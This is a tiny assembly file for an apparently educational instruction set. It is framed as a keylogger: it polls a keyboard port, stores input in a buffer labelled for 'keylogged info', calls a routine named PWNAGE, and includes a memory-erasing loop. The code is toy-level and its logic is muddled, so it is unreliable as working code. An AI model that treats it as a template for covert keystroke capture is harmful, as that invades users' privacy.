	.EQU KEYBOARD_STATUS, $000; READ
	.EQU KEYBOARD_DATA, $001;   WRITE
	.EQU @, $D00
SECURE:	.CHAR '';	STORE KEYLOGGED INFO HERE

POLL_KEYBD:	INB KEYBOARD_STATUS
	STC SECURE
	JSR PWNAGE
	JGE POLL_KEYBD;	LT SET WHEN THERE IS NO DATA
	NOP ;		Working as normal!
	INB KEYBOARD_DATA

PWNAGE:	LDC SECURE
	RTN	

ERASE:	LDX# 0
	CLR+ $000
	AOC# 50
	JLT ERASE
	.END
	